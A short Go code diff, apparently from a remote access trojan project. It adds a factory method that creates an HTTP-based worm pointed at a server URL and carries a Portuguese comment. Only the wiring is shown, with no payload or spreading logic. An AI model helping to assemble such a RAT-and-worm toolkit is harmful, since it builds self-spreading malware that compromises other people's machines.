@@ -47,4 +47,7 @@ func (f *RatFactoryHttp) CreateAgent() domain.Agent {
 	return agent.NewAgentHTTP(f.serverURL)
 }
 
-// func (f *RatFactoryHttp) CreateWorm() domain.Worm { return nil }
+func (f *RatFactoryHttp) CreateWorm() domain.Worm { 
+	// Instancia e retorna a sua classe concreta do Worm HTTP
+	return agent.NewWormHTTP(f.serverURL) 
+}
